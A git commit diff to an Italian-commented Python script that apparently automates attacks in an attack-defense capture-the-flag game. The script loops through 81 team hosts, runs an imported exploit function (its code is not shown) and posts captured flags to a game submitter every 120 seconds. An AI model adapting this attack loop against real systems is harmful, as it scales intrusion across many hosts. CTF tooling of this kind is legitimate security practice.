9ee9d678aa190a1f46765c6bf8f90d0335e931e6
Francesco Pittacolo <159448714+francesco-pittacolo@users.noreply.github.com>
2025-04-12 21:16:49 +0200

    Update attack_for_ticcket.py

--- attack_for_ticcket.py
+++ attack_for_ticcket.py
@@ -4,19 +4,24 @@ from script_ticket import *
 
 
 def send_attack(ip, team_id):
-    flags = []
-    for round in range(round_inf,round_inf+5):
-        print(f"Attacco in corso a {ip}\n")  # per debug
-        results = get_info(team_id, round)
-        print(results)
-        ctf_id = results[0]["ctf_id"] if results else None
-        ticket_id = results[0]["ticket_id"] if results else None
+    print(f"Attacco in corso a {ip}\n") 
+    results = get_info(team_id) #ritorna una lista di dizionari, per eventuali altri script modificare attributi
+    print(results) # per debug, opzionale
+    for i in range (0,4): #itera sui 4 round nelle info prese da fileID
+        #round = results[i]["round"] if results else None #se si vuole fare qualcosa con i round
+        ctf_id = results[i]["ctf_id"] if results else None
+        ticket_id = results[i]["ticket_id"] if results else None
+        #print(round) 
+        #print(ctf_id)
+        #print(ticket_id)
         flag = exploit(ip, ctf_id, ticket_id)
-        result = save_flag(flag)
-    #flag = str(ip)
-    return result
+        data = {'flag': flag}
+        response = requests.post(submitter_ip, data=data)
+        print("Status Code:", response.status_code)
+        print("Response Body:", response.text)
+    return
 
-
+#funzione per salvare le flag su un file, ma non serve più
 def save_flag(flag):
     try:
         with open("CTF-Tools/flags.txt", "a") as f:
@@ -31,6 +36,7 @@ if __name__ == "__main__":
     team_ip = "10.60.64.1"
     teams = 81 #da modificare in base al numero di team
     round_inf = 0 #scrivere qua round minore
+    submitter_ip = "http://10.81.64.1:5000" #scrivere qua submitter id
     while True:
         flags_found = 0
         for i in range(teams):
@@ -39,9 +45,8 @@ if __name__ == "__main__":
                 continue
             try:
                 print(f"Inizio attacco a {ip}")
-                flag = send_attack(ip, i, round_inf)
+                flag = send_attack(ip, i)
                 if flag:  # Se è stata trovata una flag
-                    save_flag(flag)  # Scrive la flag nel file
                     flags_found += 1
             except Exception as e:
                 print(f"[!] Errore durante l'attacco a {ip}: {e}")
@@ -52,4 +57,3 @@ if __name__ == "__main__":
 
         print(f"Giro completato. Trovate {flags_found} flag. Aspetto 120 secondi per il prossimo attacco...\n")
         time.sleep(120)
-        round_inf += 1
